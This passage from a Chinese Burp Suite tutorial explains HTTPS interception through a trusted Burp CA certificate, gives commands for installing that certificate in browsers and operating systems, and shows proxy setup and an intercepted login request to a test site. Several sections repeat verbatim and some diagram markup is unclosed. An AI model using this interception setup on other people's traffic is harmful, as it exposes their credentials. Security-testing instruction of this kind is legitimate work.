    <text x="400" y="128" text-anchor="middle" fill="#fff" font-size="15" font-weight="bold" font-family="Arial">Burp Suite Proxy</text>
    <text x="400" y="150" text-anchor="middle" fill="#ddd6fe" font-size="12" font-family="Arial">伪造网站证书给浏览器</text>
    <text x="400" y="166" text-anchor="middle" fill="#ddd6fe" font-size="11" font-family="Arial">(端口: 127.0.0.1:8080)</text>
  </g>
  <!-- 真实网站 -->
  <g>
    <rect x="610" y="60" width="160" height="110" rx="12" fill="#10b981" opacity="0.2" stroke="#34d399" stroke-width="2"/>
    <text x="690" y="102" text-anchor="middle" fill="#6ee7b7" font-size="26">🖥️</text>
    <text x="690" y="130" text-anchor="middle" fill="#fff" font-size="15" font-weight="bold" font-family="Arial">真实 Web 服务器</text>
    <text x="690" y="152" text-anchor="middle" fill="#a7f3d0" font-size="12" font-family="Arial">持有官方 CA 证书</text>
  </g>

  <!-- 请求箭头（左->中） -->
  <line x1="190" y1="115" x2="320" y2="115" stroke="#22d3ee" stroke-width="2.5" marker-end="url(#arrR)"/>
  <text x="255" y="104" text-anchor="middle" fill="#67e8f9" font-size="12" font-weight="bold" font-family="Arial">① HTTPS 请求</text>
  <text x="255" y="133" text-anchor="middle" fill="#67e8f9" font-size="11" font-family="Arial">(Burp假证书加密)</text>

  <!-- 请求箭头（中->右） -->
  <line x1="480" y1="115" x2="610" y2="115" stroke="#22d3ee" stroke-width="2.5" marker-end="url(#arrR)"/>
  <text x="545" y="104" text-anchor="middle" fill="#67e8f9" font-size="12" font-weight="bold" font-family="Arial">② 转发请求</text>
  <text x="545" y="133" text-anchor="middle" fill="#67e8f9" font-size="11" font-family="Arial">(真实证书加密)</text>

  <!-- 响应箭头（右->中） -->
  <line x1="610" y1="160" x2="480" y2="160" stroke="#f472b6" stroke-width="2.5" marker-end="url(#arrL)"/>
  <text x="545" y="149" text-anchor="middle" fill="#f9a8d4" font-size="12" font-weight="bold" font-family="Arial">③ 网站响应</text>
  <text x="545" y="178" text-anchor="middle" fill="#f9a8d4" font-size="11" font-family="Arial">(Burp 解密→明文查看)</text>

  <!-- 响应箭头（中->左） -->
  <line x1="320" y1="160" x2="190" y2="160" stroke="#f472b6" stroke-width="2.5" marker-end="url(#arrL)"/>
  <text x="255" y="149" text-anchor="middle" fill="#f9a8d4" font-size="12" font-weight="bold" font-family="Arial">④ 返回响应</text>
  <text x="255" y="178" text-anchor="middle" fill="#f9a8d4" font-size="11" font-family="Arial">(Burp重新加密给浏览器)</text>

  <!-- 底部说明 -->
  <g>
    <rect x="60" y="215" width="680" height="145" rx="10" fill="#111827" stroke="#374151"/>
    <text x="90" y="246" fill="#f59e0b" font-weight="bold" font-size="14" font-family="Arial">⭐ 关键：Burp 作为双端中间人</text>
    <text x="90" y="272" fill="#d1d5db" font-size="13" font-family="Arial">• 对浏览器：Burp 伪装成"目标网站"，用自己的 CA 签发假证书 → 浏览器因为信任 Burp CA 所以不报风险</text>
    <text x="90" y="295" fill="#d1d5db" font-size="13" font-family="Arial">• 对网站：Burp 伪装成"用户"，正常和服务器建立真正的 HTTPS 连接</text>
    <text x="90" y="318" fill="#d1d5db" font-size="13" font-family="Arial">• 中间 Burp 同时拥有两边的明文 → 你就能看到、修改所有 HTTPS 数据</text>
    <text x="90" y="344" fill="#ef4444" font-size="13" font-weight="bold" font-family="Arial">⚠️ 风险提示：这也是所有 HTTPS 攻击的原理，所以千万不要随意安装未知的根证书！</text>
  </g>
</svg>

### 获取Burp Suite CA证书

**步骤1：启动Burp Suite并开启代理**

1. 打开Burp Suite
2. 切换到"Proxy"标签页
3. 点击"Options"子标签
4. 确保"Proxy listeners"中的127.0.0.1:8080是开启状态（勾选"Running"）

**步骤2：浏览器访问证书下载页面**

在浏览器中访问：`http://burp`

或者访问：`http://127.0.0.1:8080`

你会看到一个Burp Suite的页面，点击"CA Certificate"下载证书。

证书文件名为：`cacert.der`

### Firefox浏览器安装证书

Firefox使用自己的证书库，不使用系统证书，需要单独配置：

**方式一：通过浏览器设置**

1. 打开Firefox
2. 点击右上角菜单 → "设置"
3. 搜索"证书" → 点击"查看证书"
4. 点击"证书颁发机构"标签
5. 点击"导入"
6. 选择下载的`cacert.der`文件
7. 勾选"信任此CA标识网站"和"信任此CA标识邮件用户"
8. 点击"确定"

**方式二：命令行导入**

```bash
# Linux
certutil -A -n "Burp Suite CA" -t "C,C,C" -i cacert.der -d ~/.mozilla/firefox/*.default*

# macOS
certutil -A -n "Burp Suite CA" -t "C,C,C" -i cacert.der -d ~/Library/Application\ Support/Firefox/Profiles/*.default*
```

### Chrome浏览器安装证书

Chrome使用系统证书库：

**Windows系统：**

1. 双击`cacert.der`文件
2. 选择"安装证书"
3. 选择"本地机器" → 点击"下一步"
4. 选择"将所有的证书放入下列存储" → 点击"浏览"
5. 选择"受信任的根证书颁发机构" → 点击"确定"
6. 点击"下一步" → "完成"
7. 点击"是"确认安装
8. 提示"导入成功"

**macOS系统：**

1. 双击`cacert.der`文件，打开"钥匙串访问"
2. 将证书拖拽到"系统"钥匙串
3. 双击证书，展开"信任"
4. 选择"始终信任"
5. 关闭窗口，输入密码确认

**Linux系统：**

```bash
# Ubuntu/Debian
sudo mkdir -p /usr/local/share/ca-certificates
sudo cp cacert.der /usr/local/share/ca-certificates/burpsuite.crt
sudo update-ca-certificates

# CentOS/RHEL
sudo cp cacert.der /etc/pki/ca-trust/source/anchors/burpsuite.crt
sudo update-ca-trust
```

### Edge浏览器安装证书

Edge浏览器和Chrome一样使用系统证书库，安装方法相同。

### Safari浏览器安装证书

Safari使用macOS系统证书库，按照macOS Chrome的安装方法即可。

### 验证证书安装成功

打开浏览器，访问任意HTTPS网站（如`https://www.baidu.com`），同时确保Burp Suite代理开启。

如果证书安装成功，浏览器地址栏会显示正常的锁图标，不会提示证书错误。

如果证书安装失败，浏览器会提示"您的连接不是私密连接"或"证书无效"。

---

## 1.8 浏览器代理配置详解

### 什么是代理？

代理就像是中间人。正常情况下，浏览器直接和网站通信：

```
浏览器 → 网站
```

配置代理后，浏览器先和代理通信，代理再和网站通信：

```
浏览器 → Burp Suite（代理） → 网站
```

这样，Burp Suite就能看到所有通信内容，并且可以修改内容。

**🔄 代理工作流程（请求+响应完整链路）：**

<svg viewBox="0 0 800 340" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="proxyBg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#020617"/>
      <stop offset="100%" stop-color="#172554"/>
    </linearGradient>
    <marker id="arrowReq" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="9" markerHeight="9" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#38bdf8"/>
    </marker>
    <marker id="arrowRes" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="9" markerHeight="9" orient="auto-start-reverse">
      <path d="M 10 0 L 0 5 L 10 10 z" fill="#fb7185"/>
    </marker>
  </defs>
  <rect width="800" height="340" rx="14" fill="url(#proxyBg)"/>
  <text x="400" y="30" text-anchor="middle" fill="#e2e8f0" font-size="17" font-weight="bold" font-family="Arial">Burp Suite 代理工作完整流程图</text>

  <!-- 三个节点 -->
  <g>
    <!-- 浏览器 -->
    <rect x="40" y="70" width="170" height="220" rx="14" fill="#0369a1" opacity="0.3" stroke="#0ea5e9" stroke-width="2"/>
    <text x="125" y="115" text-anchor="middle" fill="#7dd3fc" font-size="40">🌐</text>
    <text x="125" y="150" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold" font-family="Arial">Firefox / Chrome</text>
    <text x="125" y="175" text-anchor="middle" fill="#bae6fd" font-size="12" font-family="Arial">手动设置代理</text>
    <rect x="55" y="190" width="140" height="26" rx="4" fill="#0c4a6e" stroke="#0284c7"/>
    <text x="125" y="208" text-anchor="middle" fill="#e0f2fe" font-size="12" font-family="Arial">HTTP://127.0.0.1:8080</text>
    <text x="125" y="238" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">用户 → 访问网页</text>
    <text x="125" y="258" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">浏览器 → 先发给代理</text>
    <text x="125" y="278" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">代理 → 返回浏览器渲染</text>
  </g>
  <g>
    <!-- Burp -->
    <rect x="315" y="70" width="170" height="220" rx="14" fill="#581c87" opacity="0.35" stroke="#a855f7" stroke-width="2.5"/>
    <text x="400" y="115" text-anchor="middle" fill="#d8b4fe" font-size="40">🛰️</text>
    <text x="400" y="150" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold" font-family="Arial">Burp Suite Proxy</text>
    <text x="400" y="175" text-anchor="middle" fill="#ddd6fe" font-size="12" font-family="Arial">监听 127.0.0.1 : 8080</text>
    <rect x="330" y="190" width="140" height="26" rx="4" fill="#3b0764" stroke="#7e22ce"/>
    <text x="400" y="208" text-anchor="middle" fill="#f3e8ff" font-size="12" font-weight="bold" font-family="Arial">Intercept: ON ✓</text>
    <text x="400" y="238" text-anchor="middle" fill="#e9d5ff" font-size="12" font-weight="bold" font-family="Arial">🛑 可以查看/修改</text>
    <text x="400" y="258" text-anchor="middle" fill="#e9d5ff" font-size="12" font-family="Arial">⏩ Forward 放行</text>
    <text x="400" y="278" text-anchor="middle" fill="#fca5a5" font-size="12" font-family="Arial">🗑️ Drop 丢弃请求</text>
  </g>
  <g>
    <!-- Web服务器 -->
    <rect x="590" y="70" width="170" height="220" rx="14" fill="#065f46" opacity="0.3" stroke="#10b981" stroke-width="2"/>
    <text x="675" y="115" text-anchor="middle" fill="#6ee7b7" font-size="40">🖥️</text>
    <text x="675" y="150" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold" font-family="Arial">目标网站服务器</text>
    <text x="675" y="175" text-anchor="middle" fill="#a7f3d0" font-size="12" font-family="Arial">http://testphp.vulnweb.com</text>
    <rect x="605" y="190" width="140" height="26" rx="4" fill="#022c22" stroke="#047857"/>
    <text x="675" y="208" text-anchor="middle" fill="#d1fae5" font-size="12" font-family="Arial">端口 80 / 443</text>
    <text x="675" y="238" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">真实处理请求</text>
    <text x="675" y="258" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">生成 HTML/JSON 响应</text>
    <text x="675" y="278" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">原路返回给代理</text>
  </g>

  <!-- 上方蓝色请求箭头 -->
  <path d="M 210 95 C 255 60, 275 60, 315 95" stroke="#38bdf8" stroke-width="3" fill="none" marker-end="url(#arrowReq)"/>
  <text x="262" y="72" fill="#7dd3fc" font-size="12" font-weight="bold" font-family="Arial">REQUEST 请求 ①</text>
  <path d="M 485 95 C 530 60, 550 60, 590 95" stroke="#38bdf8" stroke-width="3" fill="none" marker-end="url(#arrowReq)"/>
  <text x="537" y="72" fill="#7dd3fc" font-size="12" font-weight="bold" font-family="Arial">REQUEST 转发 ②</text>

  <!-- 下方粉色响应箭头 -->
  <path d="M 590 265 C 550 300, 530 300, 485 265" stroke="#fb7185" stroke-width="3" fill="none" marker-end="url(#arrowRes)"/>
  <text x="537" y="312" fill="#fda4af" font-size="12" font-weight="bold" font-family="Arial">RESPONSE 返回 ③</text>
  <path d="M 315 265 C 275 300, 255 300, 210 265" stroke="#fb7185" stroke-width="3" fill="none" marker-end="url(#arrowRes)"/>
  <text x="262" y="312" fill="#fda4af" font-size="12" font-weight="bold" font-family="Arial">RESPONSE 转发 ④</text>


### 获取Burp Suite CA证书

**步骤1：启动Burp Suite并开启代理**

1. 打开Burp Suite
2. 切换到"Proxy"标签页
3. 点击"Options"子标签
4. 确保"Proxy listeners"中的127.0.0.1:8080是开启状态（勾选"Running"）

**步骤2：浏览器访问证书下载页面**

在浏览器中访问：`http://burp`

或者访问：`http://127.0.0.1:8080`

你会看到一个Burp Suite的页面，点击"CA Certificate"下载证书。

证书文件名为：`cacert.der`

### Firefox浏览器安装证书

Firefox使用自己的证书库，不使用系统证书，需要单独配置：

**方式一：通过浏览器设置**

1. 打开Firefox
2. 点击右上角菜单 → "设置"
3. 搜索"证书" → 点击"查看证书"
4. 点击"证书颁发机构"标签
5. 点击"导入"
6. 选择下载的`cacert.der`文件
7. 勾选"信任此CA标识网站"和"信任此CA标识邮件用户"
8. 点击"确定"

**方式二：命令行导入**

```bash
# Linux
certutil -A -n "Burp Suite CA" -t "C,C,C" -i cacert.der -d ~/.mozilla/firefox/*.default*

# macOS
certutil -A -n "Burp Suite CA" -t "C,C,C" -i cacert.der -d ~/Library/Application\ Support/Firefox/Profiles/*.default*
```

### Chrome浏览器安装证书

Chrome使用系统证书库：

**Windows系统：**

1. 双击`cacert.der`文件
2. 选择"安装证书"
3. 选择"本地机器" → 点击"下一步"
4. 选择"将所有的证书放入下列存储" → 点击"浏览"
5. 选择"受信任的根证书颁发机构" → 点击"确定"
6. 点击"下一步" → "完成"
7. 点击"是"确认安装
8. 提示"导入成功"

**macOS系统：**

1. 双击`cacert.der`文件，打开"钥匙串访问"
2. 将证书拖拽到"系统"钥匙串
3. 双击证书，展开"信任"
4. 选择"始终信任"
5. 关闭窗口，输入密码确认

**Linux系统：**

```bash
# Ubuntu/Debian
sudo mkdir -p /usr/local/share/ca-certificates
sudo cp cacert.der /usr/local/share/ca-certificates/burpsuite.crt
sudo update-ca-certificates

# CentOS/RHEL
sudo cp cacert.der /etc/pki/ca-trust/source/anchors/burpsuite.crt
sudo update-ca-trust
```

### Edge浏览器安装证书

Edge浏览器和Chrome一样使用系统证书库，安装方法相同。

### Safari浏览器安装证书

Safari使用macOS系统证书库，按照macOS Chrome的安装方法即可。

### 验证证书安装成功

打开浏览器，访问任意HTTPS网站（如`https://www.baidu.com`），同时确保Burp Suite代理开启。

如果证书安装成功，浏览器地址栏会显示正常的锁图标，不会提示证书错误。

如果证书安装失败，浏览器会提示"您的连接不是私密连接"或"证书无效"。

---

## 1.8 浏览器代理配置详解

### 什么是代理？

代理就像是中间人。正常情况下，浏览器直接和网站通信：

```
浏览器 → 网站
```

配置代理后，浏览器先和代理通信，代理再和网站通信：

```
浏览器 → Burp Suite（代理） → 网站
```

这样，Burp Suite就能看到所有通信内容，并且可以修改内容。

**🔄 代理工作流程（请求+响应完整链路）：**

<svg viewBox="0 0 800 340" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="proxyBg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#020617"/>
      <stop offset="100%" stop-color="#172554"/>
    </linearGradient>
    <marker id="arrowReq" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="9" markerHeight="9" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#38bdf8"/>
    </marker>
    <marker id="arrowRes" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="9" markerHeight="9" orient="auto-start-reverse">
      <path d="M 10 0 L 0 5 L 10 10 z" fill="#fb7185"/>
    </marker>
  </defs>
  <rect width="800" height="340" rx="14" fill="url(#proxyBg)"/>
  <text x="400" y="30" text-anchor="middle" fill="#e2e8f0" font-size="17" font-weight="bold" font-family="Arial">Burp Suite 代理工作完整流程图</text>

  <!-- 三个节点 -->
  <g>
    <!-- 浏览器 -->
    <rect x="40" y="70" width="170" height="220" rx="14" fill="#0369a1" opacity="0.3" stroke="#0ea5e9" stroke-width="2"/>
    <text x="125" y="115" text-anchor="middle" fill="#7dd3fc" font-size="40">🌐</text>
    <text x="125" y="150" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold" font-family="Arial">Firefox / Chrome</text>
    <text x="125" y="175" text-anchor="middle" fill="#bae6fd" font-size="12" font-family="Arial">手动设置代理</text>
    <rect x="55" y="190" width="140" height="26" rx="4" fill="#0c4a6e" stroke="#0284c7"/>
    <text x="125" y="208" text-anchor="middle" fill="#e0f2fe" font-size="12" font-family="Arial">HTTP://127.0.0.1:8080</text>
    <text x="125" y="238" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">用户 → 访问网页</text>
    <text x="125" y="258" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">浏览器 → 先发给代理</text>
    <text x="125" y="278" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">代理 → 返回浏览器渲染</text>
  </g>
  <g>
    <!-- Burp -->
    <rect x="315" y="70" width="170" height="220" rx="14" fill="#581c87" opacity="0.35" stroke="#a855f7" stroke-width="2.5"/>
    <text x="400" y="115" text-anchor="middle" fill="#d8b4fe" font-size="40">🛰️</text>
    <text x="400" y="150" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold" font-family="Arial">Burp Suite Proxy</text>
    <text x="400" y="175" text-anchor="middle" fill="#ddd6fe" font-size="12" font-family="Arial">监听 127.0.0.1 : 8080</text>
    <rect x="330" y="190" width="140" height="26" rx="4" fill="#3b0764" stroke="#7e22ce"/>
    <text x="400" y="208" text-anchor="middle" fill="#f3e8ff" font-size="12" font-weight="bold" font-family="Arial">Intercept: ON ✓</text>
    <text x="400" y="238" text-anchor="middle" fill="#e9d5ff" font-size="12" font-weight="bold" font-family="Arial">🛑 可以查看/修改</text>
    <text x="400" y="258" text-anchor="middle" fill="#e9d5ff" font-size="12" font-family="Arial">⏩ Forward 放行</text>
    <text x="400" y="278" text-anchor="middle" fill="#fca5a5" font-size="12" font-family="Arial">🗑️ Drop 丢弃请求</text>
  </g>
  <g>
    <!-- Web服务器 -->
    <rect x="590" y="70" width="170" height="220" rx="14" fill="#065f46" opacity="0.3" stroke="#10b981" stroke-width="2"/>
    <text x="675" y="115" text-anchor="middle" fill="#6ee7b7" font-size="40">🖥️</text>
    <text x="675" y="150" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold" font-family="Arial">目标网站服务器</text>
    <text x="675" y="175" text-anchor="middle" fill="#a7f3d0" font-size="12" font-family="Arial">http://testphp.vulnweb.com</text>
    <rect x="605" y="190" width="140" height="26" rx="4" fill="#022c22" stroke="#047857"/>
    <text x="675" y="208" text-anchor="middle" fill="#d1fae5" font-size="12" font-family="Arial">端口 80 / 443</text>
    <text x="675" y="238" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">真实处理请求</text>
    <text x="675" y="258" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">生成 HTML/JSON 响应</text>
    <text x="675" y="278" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">原路返回给代理</text>
  </g>

  <!-- 上方蓝色请求箭头 -->
  <path d="M 210 95 C 255 60, 275 60, 315 95" stroke="#38bdf8" stroke-width="3" fill="none" marker-end="url(#arrowReq)"/>
  <text x="262" y="72" fill="#7dd3fc" font-size="12" font-weight="bold" font-family="Arial">REQUEST 请求 ①</text>
  <path d="M 485 95 C 530 60, 550 60, 590 95" stroke="#38bdf8" stroke-width="3" fill="none" marker-end="url(#arrowReq)"/>
  <text x="537" y="72" fill="#7dd3fc" font-size="12" font-weight="bold" font-family="Arial">REQUEST 转发 ②</text>

  <!-- 下方粉色响应箭头 -->
  <path d="M 590 265 C 550 300, 530 300, 485 265" stroke="#fb7185" stroke-width="3" fill="none" marker-end="url(#arrowRes)"/>
  <text x="537" y="312" fill="#fda4af" font-size="12" font-weight="bold" font-family="Arial">RESPONSE 返回 ③</text>
  <path d="M 315 265 C 275 300, 255 300, 210 265" stroke="#fb7185" stroke-width="3" fill="none" marker-end="url(#arrowRes)"/>
  <text x="262" y="312" fill="#fda4af" font-size="12" font-weight="bold" font-family="Arial">RESPONSE 转发 ④</text>
</svg>

### Firefox配置代理

**方式一：手动配置**

1. 打开Firefox
2. 点击右上角菜单 → "设置"
3. 搜索"代理" → 点击"设置"
4. 选择"手动配置代理"
5. HTTP代理：`127.0.0.1`
6. 端口：`8080`
7. 勾选"也将此代理用于HTTPS"
8. 点击"确定"

**方式二：使用FoxyProxy插件（推荐）**

FoxyProxy是一个代理管理插件，可以快速切换代理：

1. 安装FoxyProxy：访问 https://addons.mozilla.org/firefox/addon/foxyproxy-standard/
2. 点击"添加到Firefox"安装
3. 安装后，Firefox右上角会出现FoxyProxy图标
4. 点击图标 → "选项"
5. 点击"添加新代理"
6. 选择"手动代理配置"
7. IP地址：`127.0.0.1`
8. 端口：`8080`
9. 点击"保存"
10. 点击图标选择刚创建的代理

优点：可以一键开启/关闭代理，方便切换

### Chrome配置代理

**方式一：系统代理设置**

Chrome使用系统代理：

**Windows：**
1. 右键"开始" → "设置"
2. 搜索"代理" → 点击"打开计算机的代理设置"
3. 开启"使用代理服务器"
4. 地址：`127.0.0.1`
5. 端口：`8080`
6. 保存

**macOS：**
1. 打开"系统设置" → "网络"
2. 选择当前网络 → "详细信息"
3. 点击"代理"标签
4. 勾选"网页代理(HTTP)"和"安全网页代理(HTTPS)"
5. 地址：`127.0.0.1`
6. 端口：`8080`
7. 点击"好"

**方式二：使用SwitchyOmega插件（推荐）**

1. 安装SwitchyOmega：访问 https://chrome.google.com/webstore/detail/proxy-switchyomega/
2. 点击"添加到Chrome"安装
3. 安装后，Chrome右上角会出现SwitchyOmega图标
4. 点击图标 → "选项"
5. 点击"新建情景模式"
6. 选择"代理服务器"
7. 名称：Burp Suite
8. 代理协议：HTTP
9. 代理服务器：`127.0.0.1`
10. 代理端口：`8080`
11. 点击"应用选项"
12. 点击图标选择"Burp Suite"

### Burp Suite内置浏览器

Burp Suite自带一个内置浏览器，已经配置好代理，推荐初学者使用：

1. 打开Burp Suite
2. 点击顶部菜单"Browser"
3. 选择"Launch Burp's browser"
4. 内置浏览器会自动打开，代理已配置好

优点：无需手动配置代理和证书，开箱即用。

---

## 1.9 Proxy模块详解

### Proxy模块是什么？

Proxy（代理）模块是Burp Suite的核心功能。就像一个邮局，拦截所有来往的信件（HTTP请求和响应），你可以查看每封信的内容，甚至可以修改信件内容再发送出去。

### Proxy模块界面

打开Burp Suite，点击"Proxy"标签，你会看到几个子标签：

**🛑 Proxy 拦截界面功能说明：**

<svg viewBox="0 0 800 430" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="uiBg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#0b1120"/>
      <stop offset="100%" stop-color="#020617"/>
    </linearGradient>
  </defs>
  <rect width="800" height="430" rx="12" fill="url(#uiBg)" stroke="#1e293b"/>
  <!-- 标题栏 -->
  <rect x="0" y="0" width="800" height="32" rx="12" fill="#1e293b"/>
  <rect x="0" y="16" width="800" height="16" fill="#1e293b"/>
  <circle cx="18" cy="16" r="6" fill="#ef4444"/>
  <circle cx="38" cy="16" r="6" fill="#eab308"/>
  <circle cx="58" cy="16" r="6" fill="#22c55e"/>
  <text x="400" y="22" text-anchor="middle" fill="#cbd5e1" font-size="12" font-family="Arial">Burp Suite - Dashboard / Proxy</text>

  <!-- 顶部模块标签栏 -->
  <g>
    <rect x="0" y="32" width="800" height="34" fill="#0f172a"/>
    <g transform="translate(8, 38)">
      <rect x="0" y="0" width="90" height="22" rx="4" fill="#020617" stroke="#475569"/><text x="45" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Dashboard</text>
      <rect x="96" y="0" width="90" height="22" rx="4" fill="#7c3aed" opacity="0.3" stroke="#a78bfa"/><text x="141" y="16" text-anchor="middle" fill="#e9d5ff" font-size="11" font-weight="bold" font-family="Arial">🔴 Proxy</text>
      <rect x="192" y="0" width="90" height="22" rx="4" fill="#020617" stroke="#475569"/><text x="237" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Target</text>
      <rect x="288" y="0" width="90" height="22" rx="4" fill="#020617" stroke="#475569"/><text x="333" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Intruder</text>
      <rect x="384" y="0" width="90" height="22" rx="4" fill="#020617" stroke="#475569"/><text x="429" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Repeater</text>
      <rect x="480" y="0" width="90" height="22" rx="4" fill="#020617" stroke="#475569"/><text x="525" y="16" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="Arial">Scanner</text>
    </g>
  </g>

  <!-- 子标签栏 -->
  <g transform="translate(0, 66)">
    <rect x="0" y="0" width="800" height="30" fill="#111827"/>
    <rect x="10" y="4" width="110" height="24" rx="5" fill="#7c3aed" stroke="#a78bfa"/>
    <text x="65" y="21" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">● Intercept (ON)</text>
    <rect x="126" y="4" width="110" height="24" rx="5" fill="#0f172a" stroke="#334155"/>
    <text x="181" y="21" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">HTTP history</text>
    <rect x="242" y="4" width="140" height="24" rx="5" fill="#0f172a" stroke="#334155"/>
    <text x="312" y="21" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">WebSockets history</text>
    <rect x="388" y="4" width="90" height="24" rx="5" fill="#0f172a" stroke="#334155"/>
    <text x="433" y="21" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">Proxy settings</text>
  </g>

  <!-- 被拦截的请求区域 -->
  <g transform="translate(10, 108)">
    <rect x="0" y="0" width="780" height="200" rx="6" fill="#0b1120" stroke="#1e293b"/>
    <!-- 方法行 -->
    <rect x="0" y="0" width="780" height="28" fill="#1e293b" rx="6"/>
    <rect x="0" y="14" width="780" height="14" fill="#1e293b"/>
    <text x="14" y="19" fill="#22d3ee" font-size="12" font-weight="bold" font-family="Arial">POST</text>
    <text x="60" y="19" fill="#e2e8f0" font-size="12" font-family="Arial">/login.php HTTP/1.1</text>
    <text x="620" y="19" fill="#f59e0b" font-size="11" font-weight="bold" font-family="Arial">⚠ INTERCEPTED · 已被拦截</text>
    <!-- 请求头 -->
    <g font-family="Consolas, monospace" font-size="11">
      <text x="14" y="52" fill="#f472b6">Host:</text><text x="64" y="52" fill="#cbd5e1">testphp.vulnweb.com</text>
      <text x="14" y="70" fill="#f472b6">User-Agent:</text><text x="104" y="70" fill="#cbd5e1">Mozilla/5.0 (Windows NT 10.0; Win64; x64)</text>
      <text x="14" y="88" fill="#f472b6">Accept:</text><text x="72" y="88" fill="#cbd5e1">text/html,application/xhtml+xml</text>
      <text x="14" y="106" fill="#f472b6">Content-Type:</text><text x="110" y="106" fill="#cbd5e1">application/x-www-form-urlencoded</text>
      <text x="14" y="124" fill="#f472b6">Content-Length:</text><text x="122" y="124" fill="#fde047">49</text>
      <text x="14" y="142" fill="#f472b6">Cookie:</text><text x="64" y="142" fill="#cbd5e1">PHPSESSID=</text><text x="156" y="142" fill="#fde047">[可在此处修改Cookie]</text>
    </g>
    <!-- 分割线 -->
    <line x1="0" y1="158" x2="780" y2="158" stroke="#334155" stroke-width="1"/>
    <text x="14" y="175" fill="#64748b" font-size="10" font-family="Arial">—— 空行表示请求头结束，下方是请求体（POST参数）——</text>
    <!-- 请求体 -->
    <g font-family="Consolas, monospace" font-size="12">
      <text x="14" y="195" fill="#86efac">uname=</text><text x="76" y="195" fill="#fbbf24" font-weight="bold">admin</text>
      <text x="140" y="195" fill="#86efac">&pass=</text><text x="195" y="195" fill="#ef4444" font-weight="bold">[ 🔓 明文密码可任意修改！]</text>
    </g>
  </g>

  <!-- 底部操作按钮栏 -->
  <g transform="translate(10, 318)">
    <rect x="0" y="0" width="780" height="40" rx="6" fill="#0f172a" stroke="#334155"/>
    <rect x="12" y="8" width="108" height="24" rx="4" fill="#16a34a" stroke="#22c55e"/>
    <text x="66" y="24" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">⏩ Forward (放行)</text>
    <rect x="128" y="8" width="108" height="24" rx="4" fill="#dc2626" stroke="#ef4444"/>
    <text x="182" y="24" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">🗑️ Drop (丢弃)</text>
    <rect x="244" y="8" width="118" height="24" rx="4" fill="#1e40af" stroke="#3b82f6"/>
    <text x="303" y="24" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">🔄 Follow redirection</text>
    <rect x="370" y="8" width="120" height="24" rx="4" fill="#7c3aed" stroke="#a855f7"/>
    <text x="430" y="24" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">📤 Send to Repeater</text>
    <rect x="498" y="8" width="118" height="24" rx="4" fill="#b45309" stroke="#f59e0b"/>
    <text x="557" y="24" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">💥 Send to Intruder</text>
    <rect x="624" y="8" width="150" height="24" rx="4" fill="#475569" stroke="#94a3b8"/>
    <text x="699" y="24" text-anchor="middle" fill="#e2e8f0" font-size="12" font-family="Arial">🔘 Intercept is on</text>
  </g>

  <!-- 底部帮助 -->
  <g transform="translate(10, 368)">
    <rect x="0" y="0" width="780" height="52" rx="6" fill="#1e1b4b" stroke="#4c1d95" opacity="0.7"/>
    <text x="16" y="22" fill="#fbbf24" font-size="13" font-weight="bold" font-family="Arial">💡 说明：</text>
    <text x="16" y="42" fill="#ddd6fe" font-size="12" font-family="Arial">被拦截时请求会"卡"在 Burp，不会发送到服务器。你可以修改参数、Cookie、UA 等内容，然后点 Forward 放行；如果不想发就点 Drop 直接丢弃。</text>
  </g>


### Firefox配置代理

**方式一：手动配置**

1. 打开Firefox
2. 点击右上角菜单 → "设置"
3. 搜索"代理" → 点击"设置"
4. 选择"手动配置代理"
5. HTTP代理：`127.0.0.1`
6. 端口：`8080`
7. 勾选"也将此代理用于HTTPS"
8. 点击"确定"

**方式二：使用FoxyProxy插件（推荐）**

FoxyProxy是一个代理管理插件，可以快速切换代理：

1. 安装FoxyProxy：访问 https://addons.mozilla.org/firefox/addon/foxyproxy-standard/
2. 点击"添加到Firefox"安装
